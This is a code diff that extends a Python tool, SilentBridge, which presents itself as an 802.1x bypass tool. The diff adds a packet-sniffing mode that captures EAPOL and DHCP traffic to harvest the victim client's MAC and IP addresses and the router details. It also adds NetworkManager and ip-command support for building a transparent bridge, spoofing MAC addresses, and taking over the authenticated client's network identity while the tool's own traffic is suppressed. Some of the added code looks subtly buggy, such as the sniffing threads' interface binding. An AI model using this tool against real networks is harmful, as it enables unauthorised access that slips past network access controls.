@@ -6,30 +6,52 @@ import argparse
 import subprocess
 import netifaces
 import sys
-from scapy.all import Ether, EAPOL, sendp
+import json
+from pathlib import Path
+from scapy.all import Ether, EAPOL, DHCP, sniff, BOOTP, sendp
+from threading import Thread, Event
+from queue import Queue
 
 class SilentBridge:
     def __init__(self):
         self.parser = self._create_parser()
         self.args = None
+        self.config_file = os.path.expanduser('~/.silentbridge')
+        self.stop_sniffing = Event()
+        self.packet_queue = Queue()
+        self.network_stack = None
+        
         # Check if running as root
         if os.geteuid() != 0:
             print("[!] This script must be run as root!")
             sys.exit(1)
+            
+        # Detect network stack on initialization
+        self.network_stack = self.check_network_stack()
+        print("[*] Detected network stack:")
+        for tool, available in self.network_stack.items():
+            print(f"  - {tool}: {'Available' if available else 'Not available'}")
     
     def _create_parser(self):
         parser = argparse.ArgumentParser(description='SilentBridge - 802.1x Bypass Tool')
         
         subparsers = parser.add_subparsers(dest='command', help='Commands')
         
+        # Analyze command
+        analyze_parser = subparsers.add_parser('analyze', help='Analyze network interfaces and detect configuration')
+        analyze_parser.add_argument('--interfaces', nargs='+', required=True, help='List of interfaces to analyze')
+        analyze_parser.add_argument('--timeout', type=int, default=30, help='Timeout in seconds for analysis')
+        analyze_parser.add_argument('--sidechannel', required=True, help='Side channel interface for management')
+        
         # Create bridge command
         create_parser = subparsers.add_parser('create', help='Create a transparent bridge')
         create_parser.add_argument('--bridge', required=True, help='Bridge interface name')
-        create_parser.add_argument('--phy', required=True, help='Interface connected to the client (the computer that authenticates itself)')
-        create_parser.add_argument('--upstream', required=True, help='Upstream interface - The interface connected to the network/router')
+        create_parser.add_argument('--phy', help='Interface connected to the client (the computer that authenticates itself)')
+        create_parser.add_argument('--upstream', help='Upstream interface - The interface connected to the network/router')
         create_parser.add_argument('--sidechannel', required=True, help='Side channel interface for management')
         create_parser.add_argument('--egress-port', type=int, default=22, help='Egress port for side channel')
         create_parser.add_argument('--use-legacy', action='store_true', help='Use legacy iptables instead of nf_tables')
+        create_parser.add_argument('--use-stored-config', action='store_true', help='Use stored configuration from previous analysis')
         
         # Destroy bridge command
         destroy_parser = subparsers.add_parser('destroy', help='Destroy a bridge')
@@ -67,7 +89,17 @@ class SilentBridge:
     def run(self):
         self.args = self.parser.parse_args()
         
-        if self.args.command == 'create':
+        if self.args.command == 'analyze':
+            self.analyze_network()
+        elif self.args.command == 'create':
+            # If using stored config, load it
+            if self.args.use_stored_config:
+                config = self.load_config()
+                if config:
+                    if not self.args.phy:
+                        self.args.phy = config.get('phy_interface')
+                    if not self.args.upstream:
+                        self.args.upstream = config.get('upstream_interface')
             self.create_transparent_bridge()
         elif self.args.command == 'destroy':
             self.destroy_bridge()
@@ -211,6 +243,11 @@ class SilentBridge:
                 print(f"[!] Interface {iface} does not exist!")
                 return
         
+        # If NetworkManager is present, unmanage the interfaces
+        if self.network_stack['networkmanager']:
+            for iface in [self.args.phy, self.args.upstream]:
+                self.handle_networkmanager_interface(iface, 'unmanage')
+        
         # Check if macchanger is installed
         if not self.check_command_exists("macchanger"):
             print("[!] macchanger is not installed. Please install it with 'apt-get install macchanger'")
@@ -246,26 +283,18 @@ class SilentBridge:
         if self.check_interface_exists(self.args.bridge):
             print(f"[*] Bridge {self.args.bridge} already exists, skipping creation...")
         else:
-            # Create the bridge
+            # Create the bridge using appropriate command
             print(f"[*] Creating bridge {self.args.bridge}...")
-            self.run_command(f"brctl addbr {self.args.bridge}")
+            if self.network_stack['bridge']:
+                self.run_command(f"ip link add name {self.args.bridge} type bridge")
+            elif self.network_stack['brctl']:
+                self.run_command(f"brctl addbr {self.args.bridge}")
+            else:
+                print("[!] No bridge creation tools found (ip or brctl)")
+                return
         
         # Make the bridge completely transparent
         self.make_bridge_transparent(self.args.bridge)
-        
-        # Enable 802.1x forwarding
-        print("[*] Enabling 802.1x forwarding...")
-        if os.path.exists(f"/sys/class/net/{self.args.bridge}/bridge/group_fwd_mask"):
-            try:
-                # Try direct command first
-                self.run_command(f"echo 8 > /sys/class/net/{self.args.bridge}/bridge/group_fwd_mask", shell=True, ignore_errors=True)
-            except:
-                # Then try our write_sysfs method
-                self.write_sysfs(f"/sys/class/net/{self.args.bridge}/bridge/group_fwd_mask", "8")
-        
-        # Enable IP forwarding
-        print("[*] Enabling IP forwarding...")
-        self.write_sysfs("/proc/sys/net/ipv4/ip_forward", "1")
         
         # Add interfaces to the bridge if not already added
         print("[*] Adding interfaces to the bridge...")
@@ -273,12 +302,18 @@ class SilentBridge:
             if self.check_interface_in_bridge(self.args.bridge, iface):
                 print(f"[*] Interface {iface} is already in bridge {self.args.bridge}, skipping...")
             else:
-                self.run_command(f"brctl addif {self.args.bridge} {iface}", ignore_errors=True)
+                if self.network_stack['bridge']:
+                    self.run_command(f"ip link set {iface} master {self.args.bridge}", ignore_errors=True)
+                else:
+                    self.run_command(f"brctl addif {self.args.bridge} {iface}", ignore_errors=True)
         
-        # Bring both sides of the bridge up
+        # Bring interfaces up using appropriate command
         print("[*] Bringing interfaces up in promiscuous mode...")
-        self.run_command(f"ifconfig {self.args.phy} 0.0.0.0 up promisc", ignore_errors=True)
-        self.run_command(f"ifconfig {self.args.upstream} 0.0.0.0 up promisc", ignore_errors=True)
+        for iface in [self.args.phy, self.args.upstream]:
+            if self.network_stack['ip']:
+                self.run_command(f"ip link set {iface} up promisc on", ignore_errors=True)
+            else:
+                self.run_command(f"ifconfig {iface} 0.0.0.0 up promisc", ignore_errors=True)
         
         time.sleep(2)
         
@@ -298,7 +333,10 @@ class SilentBridge:
         if self.check_command_exists("macchanger") and upstream_mac:
             self.run_command(f"macchanger -m {upstream_mac} {self.args.bridge}", ignore_errors=True)
         
-        self.run_command(f"ifconfig {self.args.bridge} 0.0.0.0 up promisc", ignore_errors=True)
+        if self.network_stack['ip']:
+            self.run_command(f"ip link set {self.args.bridge} up promisc on", ignore_errors=True)
+        else:
+            self.run_command(f"ifconfig {self.args.bridge} 0.0.0.0 up promisc", ignore_errors=True)
         
         # Lift radio silence
         print("[*] Lifting radio silence...")
@@ -326,29 +364,55 @@ class SilentBridge:
         
         try:
             # Get all interfaces in the bridge
+            bridge_interfaces = []
             if os.path.exists(f"/sys/devices/virtual/net/{self.args.bridge}/brif"):
                 bridge_interfaces = os.listdir(f"/sys/devices/virtual/net/{self.args.bridge}/brif")
                 
                 # Bring down all interfaces
                 print("[*] Bringing down all interfaces...")
                 for iface in bridge_interfaces:
-                    self.run_command(f"ifconfig {iface} down", ignore_errors=True)
-            else:
-                bridge_interfaces = []
-                print("[*] No interfaces found in the bridge")
+                    if self.network_stack['ip']:
+                        self.run_command(f"ip link set {iface} down", ignore_errors=True)
+                    else:
+                        self.run_command(f"ifconfig {iface} down", ignore_errors=True)
             
             # Bring down the bridge
             print("[*] Bringing down the bridge...")
-            self.run_command(f"ifconfig {self.args.bridge} down", ignore_errors=True)
+            if self.network_stack['ip']:
+                self.run_command(f"ip link set {self.args.bridge} down", ignore_errors=True)
+            else:
+                self.run_command(f"ifconfig {self.args.bridge} down", ignore_errors=True)
             
             # Remove interfaces from the bridge
             print("[*] Removing interfaces from the bridge...")
             for iface in bridge_interfaces:
-                self.run_command(f"brctl delif {self.args.bridge} {iface}", ignore_errors=True)
+                if self.network_stack['bridge']:
+                    self.run_command(f"ip link set {iface} nomaster", ignore_errors=True)
+                else:
+                    self.run_command(f"brctl delif {self.args.bridge} {iface}", ignore_errors=True)
             
             # Delete the bridge
             print("[*] Deleting the bridge...")
-            self.run_command(f"brctl delbr {self.args.bridge}", ignore_errors=True)
+            if self.network_stack['bridge']:
+                self.run_command(f"ip link delete {self.args.bridge} type bridge", ignore_errors=True)
+            else:
+                self.run_command(f"brctl delbr {self.args.bridge}", ignore_errors=True)
+            
+            # Return interfaces to NetworkManager if present
+            if self.network_stack['networkmanager']:
+                for iface in bridge_interfaces:
+                    self.handle_networkmanager_interface(iface, 'manage')
+                    # Wait for NetworkManager to take control
+                    time.sleep(2)
+                    # Bring up the interface with NetworkManager
+                    self.run_command(f"nmcli device connect {iface}", ignore_errors=True)
+            else:
+                # Bring up interfaces using traditional methods
+                for iface in bridge_interfaces:
+                    if self.network_stack['ip']:
+                        self.run_command(f"ip link set {iface} up", ignore_errors=True)
+                    else:
+                        self.run_command(f"ifconfig {iface} up", ignore_errors=True)
             
             print("[+] Bridge destroyed successfully!")
             
@@ -395,6 +459,28 @@ class SilentBridge:
         ebtables_cmd = self.get_iptables_command("ebtables")
         arptables_cmd = self.get_iptables_command("arptables")
         
+        # Configure bridge IP using appropriate method
+        print("[*] Configuring bridge IP address...")
+        if self.network_stack['networkmanager']:
+            # Remove any existing connection
+            self.run_command(f"nmcli connection delete {self.args.bridge}", ignore_errors=True)
+            
+            # Create new bridge connection
+            self.run_command(f"nmcli connection add type bridge con-name {self.args.bridge} ifname {self.args.bridge} \
+                             ipv4.addresses 169.254.66.66/24 ipv4.method manual", ignore_errors=True)
+            
+            # Activate the connection
+            self.run_command(f"nmcli connection up {self.args.bridge}", ignore_errors=True)
+        else:
+            # Configure using traditional methods
+            if self.network_stack['ip']:
+                self.run_command(f"ip addr add 169.254.66.66/24 dev {self.args.bridge}", ignore_errors=True)
+                self.run_command(f"ip link set {self.args.bridge} up promisc on", ignore_errors=True)
+            else:
+                self.run_command(f"ifconfig {self.args.bridge} 169.254.66.66 up promisc", ignore_errors=True)
+        
+        time.sleep(3)
+        
         # Initiate radio silence
         print("[*] Initiating radio silence...")
         try:
@@ -405,12 +491,6 @@ class SilentBridge:
             self.run_command(f"{arptables_cmd} -A OUTPUT -j DROP", ignore_errors=True)
         except Exception as e:
             print(f"[!] Warning: Could not set up firewall rules: {e}")
-        
-        time.sleep(3)
-        
-        # Bring the bridge up with a specific IP
-        print("[*] Bringing the bridge up...")
-        self.run_command(f"ifconfig {self.args.bridge} 169.254.66.66 up promisc", ignore_errors=True)
         
         time.sleep(3)
         
@@ -427,7 +507,11 @@ class SilentBridge:
         # Set default gateway and static ARP entry
         print("[*] Setting default gateway and static ARP entry...")
         self.run_command(f"arp -s -i {self.args.bridge} 169.254.66.1 {self.args.gw_mac}", ignore_errors=True)
-        self.run_command("route add default gw 169.254.66.1", ignore_errors=True)
+        
+        if self.network_stack['ip']:
+            self.run_command(f"ip route add default via 169.254.66.1", ignore_errors=True)
+        else:
+            self.run_command("route add default gw 169.254.66.1", ignore_errors=True)
         
         time.sleep(3)
         
@@ -486,12 +570,18 @@ class SilentBridge:
             
             # Remove the physical interface from the bridge
             print(f"[*] Removing {self.args.phy} from bridge {self.args.bridge}...")
-            self.run_command(f"ifconfig {self.args.phy} down", ignore_errors=True)
-            self.run_command(f"brctl delif {self.args.bridge} {self.args.phy}", ignore_errors=True)
+            if self.network_stack['ip']:
+                self.run_command(f"ip link set {self.args.phy} down", ignore_errors=True)
+                self.run_command(f"ip link set {self.args.phy} nomaster", ignore_errors=True)
+            else:
+                self.run_command(f"ifconfig {self.args.phy} down", ignore_errors=True)
+                self.run_command(f"brctl delif {self.args.bridge} {self.args.phy}", ignore_errors=True)
             
             # Check if the virtual interface already exists and remove it if it does
             if self.check_interface_exists(self.args.veth_name):
                 print(f"[*] Virtual interface {self.args.veth_name} already exists, removing it...")
+                if self.network_stack['networkmanager']:
+                    self.run_command(f"nmcli connection delete {self.args.veth_name}", ignore_errors=True)
                 self.run_command(f"ip link delete {self.args.veth_name}", ignore_errors=True)
             
             # Create a virtual ethernet device
@@ -500,33 +590,66 @@ class SilentBridge:
             
             # Add the virtual interface to the bridge
             print(f"[*] Adding {self.args.veth_name}_peer to bridge {self.args.bridge}...")
-            self.run_command(f"brctl addif {self.args.bridge} {self.args.veth_name}_peer", ignore_errors=True)
-            self.run_command(f"ifconfig {self.args.veth_name}_peer up promisc", ignore_errors=True)
+            if self.network_stack['bridge']:
+                self.run_command(f"ip link set {self.args.veth_name}_peer master {self.args.bridge}", ignore_errors=True)
+            else:
+                self.run_command(f"brctl addif {self.args.bridge} {self.args.veth_name}_peer", ignore_errors=True)
+            
+            if self.network_stack['ip']:
+                self.run_command(f"ip link set {self.args.veth_name}_peer up promisc on", ignore_errors=True)
+            else:
+                self.run_command(f"ifconfig {self.args.veth_name}_peer up promisc", ignore_errors=True)
             
             # Make sure the bridge is still completely transparent
             self.make_bridge_transparent(self.args.bridge)
             
-            # Set the MAC address of the virtual interface to the client's MAC
-            print(f"[*] Setting MAC address of {self.args.veth_name} to {self.args.client_mac}...")
-            self.run_command(f"ifconfig {self.args.veth_name} down", ignore_errors=True)
+            # Set the MAC address and configure IP for the virtual interface
+            print(f"[*] Configuring {self.args.veth_name}...")
             
-            if self.check_command_exists("macchanger"):
-                self.run_command(f"macchanger -m {self.args.client_mac} {self.args.veth_name}", ignore_errors=True)
+            if self.network_stack['networkmanager']:
+                # Remove any existing connection
+                self.run_command(f"nmcli connection delete {self.args.veth_name}", ignore_errors=True)
+                
+                # Create new connection with specified MAC and IP
+                self.run_command(f"nmcli connection add type ethernet \
+                                 con-name {self.args.veth_name} \
+                                 ifname {self.args.veth_name} \
+                                 ipv4.addresses {self.args.client_ip}/{self.args.netmask} \
+                                 ipv4.gateway {self.args.gateway_ip} \
+                                 ipv4.method manual \
+                                 802-3-ethernet.cloned-mac-address {self.args.client_mac}", ignore_errors=True)
+                
+                # Activate the connection
+                self.run_command(f"nmcli connection up {self.args.veth_name}", ignore_errors=True)
             else:
-                print("[!] macchanger is not installed. Please install it with 'apt-get install macchanger'")
-                print("[*] Trying to set MAC address using ip command...")
-                self.run_command(f"ip link set dev {self.args.veth_name} address {self.args.client_mac}", ignore_errors=True)
-            
-            # Configure the virtual interface with the client's IP
-            print(f"[*] Configuring {self.args.veth_name} with client IP {self.args.client_ip}...")
-            self.run_command(f"ifconfig {self.args.veth_name} {self.args.client_ip} netmask {self.args.netmask} up promisc", ignore_errors=True)
-            
-            # Add default route
-            print(f"[*] Setting default gateway to {self.args.gateway_ip}...")
-            # First delete any existing default routes
-            self.run_command("ip route del default", ignore_errors=True)
-            
-            self.run_command(f"ip route add default via {self.args.gateway_ip} dev {self.args.veth_name}", ignore_errors=True)
+                # Set MAC address using traditional methods
+                if self.network_stack['ip']:
+                    self.run_command(f"ip link set {self.args.veth_name} down", ignore_errors=True)
+                else:
+                    self.run_command(f"ifconfig {self.args.veth_name} down", ignore_errors=True)
+                
+                if self.check_command_exists("macchanger"):
+                    self.run_command(f"macchanger -m {self.args.client_mac} {self.args.veth_name}", ignore_errors=True)
+                else:
+                    print("[!] macchanger is not installed. Trying to set MAC address using ip command...")
+                    self.run_command(f"ip link set dev {self.args.veth_name} address {self.args.client_mac}", ignore_errors=True)
+                
+                # Configure IP address
+                if self.network_stack['ip']:
+                    self.run_command(f"ip addr add {self.args.client_ip}/{self.args.netmask} dev {self.args.veth_name}", ignore_errors=True)
+                    self.run_command(f"ip link set {self.args.veth_name} up promisc on", ignore_errors=True)
+                else:
+                    self.run_command(f"ifconfig {self.args.veth_name} {self.args.client_ip} netmask {self.args.netmask} up promisc", ignore_errors=True)
+                
+                # Add default route
+                print(f"[*] Setting default gateway to {self.args.gateway_ip}...")
+                # First delete any existing default routes
+                self.run_command("ip route del default", ignore_errors=True)
+                
+                if self.network_stack['ip']:
+                    self.run_command(f"ip route add default via {self.args.gateway_ip}", ignore_errors=True)
+                else:
+                    self.run_command(f"route add default gw {self.args.gateway_ip}", ignore_errors=True)
             
             # Enable IP forwarding
             print("[*] Enabling IP forwarding...")
@@ -541,6 +664,213 @@ class SilentBridge:
             
         except Exception as e:
             print(f"[!] Error during takeover: {e}")
+
+    def load_config(self):
+        """Load stored configuration from file"""
+        try:
+            if os.path.exists(self.config_file):
+                with open(self.config_file, 'r') as f:
+                    return json.load(f)
+        except Exception as e:
+            print(f"[!] Error loading configuration: {e}")
+        return {}
+
+    def save_config(self, config):
+        """Save configuration to file"""
+        try:
+            with open(self.config_file, 'w') as f:
+                json.dump(config, f)
+        except Exception as e:
+            print(f"[!] Error saving configuration: {e}")
+
+    def packet_callback(self, packet):
+        """Callback function for packet analysis"""
+        if self.stop_sniffing.is_set():
+            return
+        
+        self.packet_queue.put(packet)
+
+    def analyze_packets(self, timeout):
+        """Analyze collected packets to determine network configuration"""
+        end_time = time.time() + timeout
+        config = {
+            'phy_interface': None,
+            'upstream_interface': None,
+            'client_mac': None,
+            'client_ip': None,
+            'router_mac': None,
+            'router_ip': None
+        }
+        
+        eap_interfaces = set()
+        dhcp_interfaces = set()
+        dhcp_transactions = {}
+        
+        while time.time() < end_time:
+            try:
+                packet = self.packet_queue.get(timeout=1)
+                
+                # Check for EAP packets
+                if EAPOL in packet:
+                    eap_interfaces.add(packet.sniffed_on)
+                    if packet[EAPOL].type == 1:  # EAPOL-Start
+                        config['client_mac'] = packet[Ether].src
+                
+                # Check for DHCP packets
+                if DHCP in packet:
+                    dhcp_interfaces.add(packet.sniffed_on)
+                    
+                    if packet[BOOTP].op == 1:  # DHCP Request
+                        transaction_id = packet[BOOTP].xid
+                        dhcp_transactions[transaction_id] = {
+                            'client_mac': packet[Ether].src,
+                            'interface': packet.sniffed_on
+                        }
+                    
+                    elif packet[BOOTP].op == 2:  # DHCP Reply
+                        transaction_id = packet[BOOTP].xid
+                        if transaction_id in dhcp_transactions:
+                            config['client_mac'] = dhcp_transactions[transaction_id]['client_mac']
+                            config['client_ip'] = packet[BOOTP].yiaddr
+                            config['router_ip'] = packet[BOOTP].siaddr
+                            config['router_mac'] = packet[Ether].src
+                            config['phy_interface'] = dhcp_transactions[transaction_id]['interface']
+                            config['upstream_interface'] = packet.sniffed_on
+                
+            except Exception:
+                continue
+            
+            # If we have all the information we need, we can stop early
+            if all(v is not None for v in config.values()):
+                break
+        
+        # If we couldn't determine interfaces from DHCP, try to use EAP
+        if config['phy_interface'] is None and len(eap_interfaces) == 1:
+            config['phy_interface'] = list(eap_interfaces)[0]
+            # Assume the other interface is upstream
+            other_interfaces = set(self.args.interfaces) - {config['phy_interface']}
+            if len(other_interfaces) == 1:
+                config['upstream_interface'] = list(other_interfaces)[0]
+        
+        return config
+
+    def analyze_network(self):
+        """Analyze network interfaces to determine configuration"""
+        print("[*] Starting network analysis...")
+        
+        # Check if interfaces exist
+        for iface in self.args.interfaces:
+            if not self.check_interface_exists(iface):
+                print(f"[!] Interface {iface} does not exist!")
+                return
+        
+        # Start packet capture on all interfaces
+        threads = []
+        for iface in self.args.interfaces:
+            thread = Thread(target=lambda: sniff(
+                iface=iface,
+                prn=self.packet_callback,
+                store=0,
+                stop_filter=lambda _: self.stop_sniffing.is_set()
+            ))
+            thread.daemon = True
+            thread.start()
+            threads.append(thread)
+        
+        print("[*] Listening for EAP and DHCP packets...")
+        print(f"[*] Analysis will timeout in {self.args.timeout} seconds")
+        print("[*] Please initiate 802.1x authentication or DHCP request on the client...")
+        
+        # Analyze packets
+        config = self.analyze_packets(self.args.timeout)
+        
+        # Stop packet capture
+        self.stop_sniffing.set()
+        for thread in threads:
+            thread.join()
+        
+        # Print results
+        print("\n[+] Analysis complete!")
+        print("\nDetected Configuration:")
+        print("-----------------------")
+        if config['phy_interface']:
+            print(f"Client Interface (phy): {config['phy_interface']}")
+        else:
+            print("[!] Could not determine client interface")
+        
+        if config['upstream_interface']:
+            print(f"Upstream Interface: {config['upstream_interface']}")
+        else:
+            print("[!] Could not determine upstream interface")
+        
+        if config['client_mac']:
+            print(f"Client MAC Address: {config['client_mac']}")
+        else:
+            print("[!] Could not determine client MAC address")
+        
+        if config['client_ip']:
+            print(f"Client IP Address: {config['client_ip']}")
+        else:
+            print("[!] Could not determine client IP address")
+        
+        if config['router_mac']:
+            print(f"Router MAC Address: {config['router_mac']}")
+        else:
+            print("[!] Could not determine router MAC address")
+        
+        if config['router_ip']:
+            print(f"Router IP Address: {config['router_ip']}")
+        else:
+            print("[!] Could not determine router IP address")
+        
+        # Save configuration
+        if any(v is not None for v in config.values()):
+            print("\n[*] Saving configuration...")
+            self.save_config(config)
+            print(f"[+] Configuration saved to {self.config_file}")
+        else:
+            print("\n[!] No configuration detected to save")
+
+    def check_network_stack(self):
+        """Detect available networking tools and stack"""
+        tools = {
+            'networkmanager': self.check_command_exists('nmcli'),
+            'ip': self.check_command_exists('ip'),
+            'ifconfig': self.check_command_exists('ifconfig'),
+            'brctl': self.check_command_exists('brctl'),
+            'bridge': self.check_command_exists('bridge')  # Modern bridge command
+        }
+        return tools
+
+    def handle_networkmanager_interface(self, interface, action='unmanage'):
+        """Handle NetworkManager interface management
+        action: 'unmanage' or 'manage'
+        """
+        if not self.network_stack['networkmanager']:
+            return False
+            
+        try:
+            if action == 'unmanage':
+                # First check if interface is managed by NetworkManager
+                result = self.run_command(f"nmcli device status | grep {interface}")
+                if not result or 'unmanaged' in result:
+                    return True
+                    
+                print(f"[*] Removing {interface} from NetworkManager control...")
+                self.run_command(f"nmcli device set {interface} managed no")
+                
+                # Wait for NetworkManager to release the interface
+                time.sleep(2)
+                return True
+                
+            elif action == 'manage':
+                print(f"[*] Returning {interface} to NetworkManager control...")
+                self.run_command(f"nmcli device set {interface} managed yes")
+                return True
+                
+        except Exception as e:
+            print(f"[!] Error handling NetworkManager for {interface}: {e}")
+            return False
 
 if __name__ == "__main__":
     bridge = SilentBridge()
